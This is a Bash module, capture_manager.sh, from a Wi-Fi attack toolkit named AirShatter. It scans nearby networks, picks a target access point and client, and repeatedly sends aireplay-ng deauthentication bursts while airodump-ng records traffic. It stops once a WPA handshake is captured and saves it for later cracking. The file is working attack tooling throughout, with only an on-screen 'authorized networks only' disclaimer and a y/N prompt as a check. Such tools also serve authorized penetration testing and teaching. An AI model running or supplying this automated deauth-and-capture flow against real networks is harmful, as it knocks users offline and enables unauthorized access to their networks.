#!/bin/bash
# =============================================================================
# AirShatter — modules/capture_manager.sh
# Handshake Capture — Combined airodump + deauth flow
#
# HOW IT WORKS (airgeddon-style):
#   1. Scan nearby networks — user picks target AP
#   2. Optionally discover and pick a specific client
#   3. airodump-ng starts in background on the target BSSID/channel
#   4. aireplay-ng sends deauth bursts in a loop (foreground)
#   5. Script polls the live capture file for a valid EAPOL handshake
#   6. As soon as handshake is detected → both processes stop automatically
#   7. User can also stop manually at any time
#
# Mode 2 (passive) skips deauth — just captures and waits.
#
# Developer: amigoDcyber
# =============================================================================

CAPTURE_DIR="${AS_ROOT}/captures"

# ─── xterm helper (used for broad/passive mode only) ──────────────────────────
_capture_in_xterm() {
    local title="$1"; shift
    if command -v xterm &>/dev/null; then
        xterm -title "$title" \
              -bg black -fg cyan \
              -fa 'Monospace' -fs 10 \
              -hold \
              -e "$@"
    else
        print_warning "xterm not found — running inline (Ctrl+C to stop)."
        echo
        "$@"
    fi
}

# ─── Pick an existing capture file (used by analyzer + crack modules) ─────────
pick_capture_file() {
    SELECTED_CAPTURE=""
    mkdir -p "$CAPTURE_DIR"

    local files=()
    for f in "$CAPTURE_DIR"/*.cap "$CAPTURE_DIR"/*.pcap "$CAPTURE_DIR"/*.pcapng; do
        [[ -f "$f" ]] && files+=("$f")
    done

    if [[ ${#files[@]} -eq 0 ]]; then
        print_warning "No capture files in $CAPTURE_DIR"
        echo
        print_info "Enter a full path manually:"
        read -rp "  Path: " manual_path
        manual_path="${manual_path/#\~/$HOME}"
        if [[ -f "$manual_path" ]]; then
            SELECTED_CAPTURE="$manual_path"; return 0
        else
            print_error "File not found: $manual_path"; return 1
        fi
    fi

    echo -e "  ${GRAY}Directory: $CAPTURE_DIR${NC}"
    echo
    printf "  ${BCYAN}%-5s %-42s %-8s %-12s${NC}\n" "No." "Filename" "Size" "Date"
    echo -e "  ${GRAY}$(printf '%.0s─' {1..72})${NC}"

    local i=1
    for f in "${files[@]}"; do
        local size date name
        size=$(du -sh "$f" 2>/dev/null | cut -f1)
        date=$(stat -c '%y' "$f" 2>/dev/null | cut -d' ' -f1)
        name=$(basename "$f")
        printf "  ${WHITE}[%-3s]${NC} ${BGREEN}%-42s${NC} ${GRAY}%-8s %-12s${NC}\n" \
               "$i" "${name:0:41}" "$size" "$date"
        ((i++))
    done

    echo -e "  ${GRAY}[m]   Enter path manually${NC}"
    echo
    read -rp "$(echo -e "  ${BPURPLE}Select${NC}: ")" sel

    if [[ "$sel" == "m" ]]; then
        read -rp "  Path: " manual_path
        manual_path="${manual_path/#\~/$HOME}"
        if [[ -f "$manual_path" ]]; then
            SELECTED_CAPTURE="$manual_path"; return 0
        else
            print_error "File not found."; return 1
        fi
    elif [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#files[@]} )); then
        SELECTED_CAPTURE="${files[$((sel-1))]}"; return 0
    else
        print_error "Invalid selection."; return 1
    fi
}

# ─── Survey: scan for nearby APs and populate selection arrays ────────────────
# Sets globals: _survey_bssids[] _survey_ssids[] _survey_channels[]
_survey_networks() {
    local mon_iface="$1"
    local duration="${2:-15}"
    local out="/tmp/as_survey_$$"

    print_info "Scanning for ${duration}s — nearby networks will appear below..."
    echo

    airodump-ng \
        --write "$out" \
        --output-format csv \
        --write-interval 5 \
        "$mon_iface" &>/dev/null &
    local pid=$!

    local i=$duration
    while (( i > 0 )); do
        printf "\r  ${CYAN}Scanning... %2ds remaining${NC}" "$i"
        sleep 1
        ((i--))
    done
    printf "\r  ${BGREEN}Scan complete.              ${NC}\n"

    kill "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null

    local csv="${out}-01.csv"
    if [[ ! -f "$csv" ]]; then
        print_warning "No data collected — check monitor mode is active."
        rm -f "${out}"* 2>/dev/null
        return 1
    fi

    echo
    printf "  ${BCYAN}%-5s %-28s %-19s %-4s %-10s %-5s${NC}\n" \
           "No." "SSID" "BSSID" "CH" "Encryption" "PWR"
    echo -e "  ${GRAY}$(printf '%.0s─' {1..76})${NC}"

    _survey_bssids=()
    _survey_ssids=()
    _survey_channels=()

    local in_sta=false idx=1
    while IFS=',' read -r bssid _ _ ch _ privacy _ _ pwr _ _ _ _ essid _; do
        [[ "$bssid" =~ ^[[:space:]]*(Station|BSSID) ]] && {
            [[ "$bssid" =~ Station ]] && in_sta=true
            continue
        }
        $in_sta && continue
        local cb="${bssid// /}"
        [[ -z "$cb" ]] && continue
        local ce="${essid// /}" cch="${ch// /}" cp="${privacy// /}" cs="${pwr// /}"

        printf "  ${WHITE}[%-3s]${NC} ${WHITE}%-28s${NC} ${GRAY}%-19s${NC} ${CYAN}%-4s${NC} ${YELLOW}%-10s${NC} ${GREEN}%-5s${NC}\n" \
               "$idx" "${ce:0:27}" "$cb" "$cch" "${cp:-Open}" "${cs:--}"

        _survey_bssids+=("$cb")
        _survey_ssids+=("${ce:-(hidden)}")
        _survey_channels+=("$cch")
        ((idx++))
    done < "$csv"

    rm -f "${out}"* 2>/dev/null

    if [[ ${#_survey_bssids[@]} -eq 0 ]]; then
        print_warning "No access points found."
        return 1
    fi

    echo
    return 0
}

# ─── Client discovery for a specific BSSID ────────────────────────────────────
# Sets global: _discovered_clients[]
_discover_clients() {
    local mon_iface="$1"
    local bssid="$2"
    local out="/tmp/as_clients_$$"

    print_info "Looking for associated clients on $bssid (8 seconds)..."

    airodump-ng \
        --bssid "$bssid" \
        --write "$out" \
        --output-format csv \
        "$mon_iface" &>/dev/null &
    local pid=$!

    local i=8
    while (( i > 0 )); do
        printf "\r  ${CYAN}Discovering clients... %2ds${NC}" "$i"
        sleep 1; ((i--))
    done
    printf "\r  ${BGREEN}Done.                      ${NC}\n"

    kill "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null

    _discovered_clients=()
    local csv="${out}-01.csv"

    if [[ -f "$csv" ]]; then
        local in_sta=false
        while IFS=',' read -r station _ _ _ _ _ _; do
            [[ "$station" =~ ^[[:space:]]*Station ]] && { in_sta=true; continue; }
            $in_sta || continue
            local cs="${station// /}"
            [[ "$cs" =~ ^[0-9a-fA-F:]{17}$ ]] && _discovered_clients+=("$cs")
        done < "$csv"
    fi

    rm -f "${out}"* 2>/dev/null

    if [[ ${#_discovered_clients[@]} -eq 0 ]]; then
        print_warning "No associated clients found."
        return 1
    fi

    echo
    printf "  ${BCYAN}%-5s %-20s${NC}\n" "No." "Client MAC"
    echo -e "  ${GRAY}$(printf '%.0s─' {1..28})${NC}"
    local i=1
    for mac in "${_discovered_clients[@]}"; do
        printf "  ${WHITE}[%-3s]${NC} ${BGREEN}%s${NC}\n" "$i" "$mac"
        ((i++))
    done
    echo
    return 0
}

# ─── Check a cap file for a valid EAPOL handshake using hcxpcapngtool ─────────
# Returns 0 if at least one valid pair found, 1 otherwise
_handshake_found() {
    local cap="$1"
    [[ ! -f "$cap" || ! -s "$cap" ]] && return 1

    local tmp="/tmp/as_hs_check_$$"
    hcxpcapngtool -o "$tmp" "$cap" &>/dev/null
    local found=1
    [[ -f "$tmp" && -s "$tmp" ]] && found=0
    rm -f "$tmp"
    return $found
}

# ─── Core combined capture + deauth engine ────────────────────────────────────
# This is the airgeddon-style combined flow:
#   airodump-ng runs in background → aireplay-ng loops in foreground
#   Script polls for handshake every 5s → stops both when found
_run_combined_capture() {
    local mon_iface="$1"
    local bssid="$2"
    local channel="$3"
    local client="$4"       # FF:FF:FF:FF:FF:FF = broadcast
    local out_prefix="$5"
    local deauth_count="$6" # packets per burst, 0 = passive (no deauth)

    local cap_file="${out_prefix}-01.cap"
    local airodump_pid="" aireplay_pid=""

    # ── Cleanup handler — kills both bg processes on exit/Ctrl+C ──────────────
    _combined_cleanup() {
        [[ -n "$airodump_pid" ]] && kill "$airodump_pid" 2>/dev/null
        [[ -n "$aireplay_pid" ]] && kill "$aireplay_pid" 2>/dev/null
        wait "$airodump_pid" "$aireplay_pid" 2>/dev/null
    }
    trap _combined_cleanup EXIT INT TERM

    # ── Start airodump-ng in background ───────────────────────────────────────
    airodump-ng \
        --bssid   "$bssid" \
        --channel "$channel" \
        --write   "$out_prefix" \
        --output-format pcap,csv \
        --write-interval 5 \
        "$mon_iface" &>/dev/null &
    airodump_pid=$!

    sleep 2   # give airodump a moment to initialize

    # ── Status display ─────────────────────────────────────────────────────────
    echo
    echo -e "  ${BCYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if (( deauth_count > 0 )); then
        echo -e "  ${BGREEN}● Capture + Deauth running${NC}"
    else
        echo -e "  ${BGREEN}● Passive capture running${NC}"
    fi
    echo -e "  ${CYAN}BSSID    :${NC} $bssid"
    echo -e "  ${CYAN}Channel  :${NC} $channel"
    echo -e "  ${CYAN}Client   :${NC} $client"
    echo -e "  ${CYAN}Output   :${NC} $cap_file"
    echo -e "  ${BCYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo
    print_info "Polling for handshake every 5s. Press Ctrl+C to stop manually."
    echo

    local elapsed=0
    local burst=0

    while true; do

        # ── Send deauth burst (skip if passive mode) ───────────────────────────
        if (( deauth_count > 0 )); then
            ((burst++))
            printf "  ${YELLOW}[%3ds]${NC} Burst #%d — sending %d deauth frame(s) to %s\n" \
                   "$elapsed" "$burst" "$deauth_count" \
                   "$( [[ "$client" == "FF:FF:FF:FF:FF:FF" ]] && echo "broadcast" || echo "$client" )"

            aireplay-ng \
                -0 "$deauth_count" \
                -a "$bssid" \
                -c "$client" \
                "$mon_iface" &>/dev/null &
            aireplay_pid=$!
            wait "$aireplay_pid" 2>/dev/null
            aireplay_pid=""
        fi

        # ── Wait then poll ────────────────────────────────────────────────────
        sleep 5
        (( elapsed += 5 ))

        # ── Check for handshake ───────────────────────────────────────────────
        printf "  ${GRAY}[%3ds]${NC} Checking for handshake in %s...\n" \
               "$elapsed" "$(basename "$cap_file")"

        if _handshake_found "$cap_file"; then
            echo
            echo -e "  ${BGREEN}╔══════════════════════════════════════════════╗${NC}"
            echo -e "  ${BGREEN}║   🤝  HANDSHAKE CAPTURED!                    ║${NC}"
            echo -e "  ${BGREEN}╚══════════════════════════════════════════════╝${NC}"
            echo
            # Stop airodump cleanly
            kill "$airodump_pid" 2>/dev/null
            wait "$airodump_pid" 2>/dev/null
            airodump_pid=""
            trap - EXIT INT TERM
            return 0
        fi

        # ── Passive mode: no deauth — just wait with a dot ticker ─────────────
        if (( deauth_count == 0 )); then
            printf "  ${GRAY}[%3ds]${NC} Waiting for client to authenticate naturally...\n" \
                   "$elapsed"
        fi

    done
}

# ─── Module entry point ───────────────────────────────────────────────────────
module_start_capture() {
    print_section "Capture Handshake"
    log_separator
    log_action "MODULE" "capture_manager — entry"

    require_monitor_mode || {
        echo
        print_info "Enable monitor mode first — Menu option 2."
        pause
        return 1
    }

    require_tool "airodump-ng"   || { pause; return 1; }
    require_tool "hcxpcapngtool" || { pause; return 1; }

    mkdir -p "$CAPTURE_DIR"

    echo -e "  ${CYAN}Monitor interface :${NC} ${WHITE}$MONITOR_IFACE${NC}"
    echo -e "  ${CYAN}Output directory  :${NC} ${WHITE}$CAPTURE_DIR${NC}"
    echo

    # ── Mode selection ────────────────────────────────────────────────────────
    echo -e "  ${WHITE}Capture mode:${NC}"
    echo
    echo -e "  ${BGREEN}[1]${NC} ${WHITE}Auto Handshake Capture${NC}  ${GRAY}(scan → pick target → capture + deauth until handshake)${NC}"
    echo -e "  ${BGREEN}[2]${NC} ${WHITE}Passive Capture${NC}         ${GRAY}(scan → pick target → capture only, wait for natural auth)${NC}"
    echo -e "  ${BGREEN}[3]${NC} ${WHITE}Broad Capture${NC}           ${GRAY}(all channels, no filter — save everything)${NC}"
    echo -e "  ${BGREEN}[0]${NC} Back"
    echo
    read -rp "$(echo -e "  ${BPURPLE}Choice [0-3]${NC}: ")" cap_mode

    # ── Mode 3: broad passive — just open airodump in xterm ───────────────────
    if [[ "$cap_mode" == "3" ]]; then
        local ts
        ts=$(date +%Y%m%d_%H%M%S)
        local out_prefix="${CAPTURE_DIR}/capture_${ts}"
        echo
        print_info "Starting broad capture — close xterm to stop."
        log_action "CAPTURE_START" "Broad mode iface=$MONITOR_IFACE out=$out_prefix"

        _capture_in_xterm "AirShatter — Broad Capture [$MONITOR_IFACE]" \
            airodump-ng \
                --write "$out_prefix" \
                --output-format pcap,csv \
                --write-interval 30 \
                "$MONITOR_IFACE"

        local cap_file="${out_prefix}-01.cap"
        if [[ -f "$cap_file" ]]; then
            local size
            size=$(du -sh "$cap_file" | cut -f1)
            SELECTED_CAPTURE="$cap_file"
            print_success "Saved: $(basename "$cap_file") ($size)"
            log_success "CAPTURE_COMPLETE broad file=$(basename "$cap_file") size=$size"
        else
            print_warning "No capture file written."
        fi
        return 0
    fi

    [[ "$cap_mode" == "0" ]] && return 0
    if [[ "$cap_mode" != "1" && "$cap_mode" != "2" ]]; then
        print_error "Invalid choice."
        return 1
    fi

    local deauth_mode=false
    [[ "$cap_mode" == "1" ]] && deauth_mode=true

    # ── Deauth mode requires aireplay-ng ──────────────────────────────────────
    if $deauth_mode; then
        require_tool "aireplay-ng" || {
            print_warning "aireplay-ng not found — falling back to passive mode."
            deauth_mode=false
        }
    fi

    # ── Disclaimer for deauth mode ────────────────────────────────────────────
    if $deauth_mode; then
        echo
        echo -e "${BRED}  ╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${BRED}  ║  ⚠  AUTO CAPTURE — AUTHORIZED NETWORKS ONLY         ║${NC}"
        echo -e "${BRED}  ╠══════════════════════════════════════════════════════╣${NC}"
        echo -e "${BRED}  ║${NC}  Deauth frames will be sent to trigger handshake.      ${BRED}║${NC}"
        echo -e "${BRED}  ║${NC}  Only use on ${WHITE}networks you own or are authorized${NC} to   ${BRED}║${NC}"
        echo -e "${BRED}  ║${NC}  test. Unauthorized use is ${WHITE}illegal${NC}.                  ${BRED}║${NC}"
        echo -e "${BRED}  ╚══════════════════════════════════════════════════════╝${NC}"
        echo
        read -rp "$(echo -e "  ${BPURPLE}I confirm this is my authorized lab network [y/N]${NC}: ")" ack
        [[ "${ack,,}" == "y" ]] || { print_info "Cancelled."; return 0; }
    fi

    # ── Step 1: scan and pick target AP ───────────────────────────────────────
    echo
    print_section "Step 1 — Select Target Network"
    _survey_networks "$MONITOR_IFACE" 15 || { pause; return 1; }

    local target_bssid="" target_ssid="" target_channel=""

    read -rp "$(echo -e "  ${BPURPLE}Select network number (or Enter to type BSSID manually)${NC}: ")" tnum

    if [[ "$tnum" =~ ^[0-9]+$ ]] && \
       (( tnum >= 1 && tnum <= ${#_survey_bssids[@]} )); then
        target_bssid="${_survey_bssids[$((tnum-1))]}"
        target_ssid="${_survey_ssids[$((tnum-1))]}"
        target_channel="${_survey_channels[$((tnum-1))]}"
        print_success "Target: ${target_ssid}  (${target_bssid})  CH ${target_channel}"
    else
        read -rp "$(echo -e "  ${BPURPLE}BSSID (XX:XX:XX:XX:XX:XX)${NC}: ")" target_bssid
        target_bssid="${target_bssid// /}"
        if [[ ! "$target_bssid" =~ ^[0-9a-fA-F:]{17}$ ]]; then
            print_error "Invalid BSSID."; return 1
        fi
        read -rp "$(echo -e "  ${BPURPLE}Channel${NC}: ")" target_channel
    fi

    if [[ -z "$target_channel" ]]; then
        print_error "Channel is required for targeted capture."
        return 1
    fi

    # ── Step 2: client selection (deauth mode only) ───────────────────────────
    local target_client="FF:FF:FF:FF:FF:FF"

    if $deauth_mode; then
        echo
        print_section "Step 2 — Select Client Target"
        echo -e "  ${WHITE}[1]${NC} Broadcast       ${GRAY}(all associated clients)${NC}"
        echo -e "  ${WHITE}[2]${NC} Specific client ${GRAY}(scan for associated MACs first)${NC}"
        echo -e "  ${WHITE}[3]${NC} Enter MAC manually"
        echo
        read -rp "$(echo -e "  ${BPURPLE}Choice [1-3]${NC}: ")" cm

        case "$cm" in
            2)
                echo
                _discover_clients "$MONITOR_IFACE" "$target_bssid"
                if [[ ${#_discovered_clients[@]} -gt 0 ]]; then
                    read -rp "$(echo -e "  ${BPURPLE}Select client number (Enter = broadcast)${NC}: ")" cn
                    if [[ "$cn" =~ ^[0-9]+$ ]] && \
                       (( cn >= 1 && cn <= ${#_discovered_clients[@]} )); then
                        target_client="${_discovered_clients[$((cn-1))]}"
                        print_success "Client: $target_client"
                    fi
                fi
                ;;
            3)
                read -rp "$(echo -e "  ${BPURPLE}Client MAC${NC}: ")" target_client
                target_client="${target_client// /}"
                if [[ ! "$target_client" =~ ^[0-9a-fA-F:]{17}$ ]]; then
                    print_error "Invalid MAC."; return 1
                fi
                ;;
            *) target_client="FF:FF:FF:FF:FF:FF" ;;
        esac
    fi

    # ── Step 3: deauth burst size ─────────────────────────────────────────────
    local deauth_count=0
    if $deauth_mode; then
        echo
        read -rp "$(echo -e "  ${BPURPLE}Deauth packets per burst [default: 5]${NC}: ")" deauth_count
        deauth_count="${deauth_count:-5}"
        if ! [[ "$deauth_count" =~ ^[0-9]+$ ]] || \
           (( deauth_count < 1 || deauth_count > 64 )); then
            print_warning "Invalid — using default: 5"
            deauth_count=5
        fi
    fi

    # ── Build output filename ─────────────────────────────────────────────────
    local ts
    ts=$(date +%Y%m%d_%H%M%S)
    local safe_ssid=""
    if [[ -n "$target_ssid" && "$target_ssid" != "(hidden)" ]]; then
        safe_ssid="_$(echo "$target_ssid" | tr -cs '[:alnum:]' '_' | \
                      sed 's/__*/_/g; s/_$//')"
    fi
    local out_prefix="${CAPTURE_DIR}/capture_${ts}${safe_ssid}"

    # ── Summary before starting ───────────────────────────────────────────────
    echo
    print_section "Step 3 — Capture Configuration"
    echo -e "  ${CYAN}SSID      :${NC} ${WHITE}${target_ssid:-(unknown)}${NC}"
    echo -e "  ${CYAN}BSSID     :${NC} ${WHITE}$target_bssid${NC}"
    echo -e "  ${CYAN}Channel   :${NC} ${WHITE}$target_channel${NC}"
    if $deauth_mode; then
        echo -e "  ${CYAN}Client    :${NC} ${WHITE}$target_client${NC}  ${GRAY}$([ "$target_client" = "FF:FF:FF:FF:FF:FF" ] && echo "(broadcast)")${NC}"
        echo -e "  ${CYAN}Burst size:${NC} ${WHITE}$deauth_count pkts${NC}"
    else
        echo -e "  ${CYAN}Mode      :${NC} ${WHITE}Passive (no deauth)${NC}"
    fi
    echo -e "  ${CYAN}Output    :${NC} ${WHITE}${out_prefix}-01.cap${NC}"
    echo
    print_warning "Ctrl+C at any time to stop and save what was captured."
    echo

    log_action "CAPTURE_START" \
        "mode=$(  $deauth_mode && echo auto || echo passive  ) \
iface=$MONITOR_IFACE bssid=$target_bssid ch=$target_channel \
client=$target_client bursts=$deauth_count out=$out_prefix"

    # ── Run combined engine ───────────────────────────────────────────────────
    _run_combined_capture \
        "$MONITOR_IFACE" \
        "$target_bssid" \
        "$target_channel" \
        "$target_client" \
        "$out_prefix" \
        "$deauth_count"

    local engine_rc=$?

    # ── Post-capture report ───────────────────────────────────────────────────
    echo
    local cap_file="${out_prefix}-01.cap"

    if [[ -f "$cap_file" && -s "$cap_file" ]]; then
        local size
        size=$(du -sh "$cap_file" | cut -f1)

        echo -e "  ${BCYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "  ${BGREEN}Capture Session Complete${NC}"
        echo -e "  ${CYAN}File    :${NC} $(basename "$cap_file")"
        echo -e "  ${CYAN}Size    :${NC} $size"
        echo -e "  ${CYAN}Path    :${NC} $cap_file"

        if (( engine_rc == 0 )); then
            echo -e "  ${CYAN}Result  :${NC} ${BGREEN}Handshake confirmed ✓${NC}"
        else
            # Verify even if engine_rc!=0 (user stopped manually)
            if _handshake_found "$cap_file"; then
                echo -e "  ${CYAN}Result  :${NC} ${BGREEN}Handshake found ✓${NC}"
                engine_rc=0
            else
                echo -e "  ${CYAN}Result  :${NC} ${YELLOW}No handshake detected yet${NC}"
                print_info "Try analyzing the file — a partial handshake may still be usable."
            fi
        fi

        echo -e "  ${BCYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo

        SELECTED_CAPTURE="$cap_file"

        log_success "CAPTURE_COMPLETE file=$(basename "$cap_file") size=$size hs_found=$engine_rc"
        print_success "Use Menu option 5 to analyze, or option 6 to audit password strength."
    else
        print_warning "No capture file found at: $cap_file"
        print_info "Session may have been stopped before airodump flushed to disk."
        log_warning "CAPTURE_NO_FILE expected=$cap_file"
    fi
}
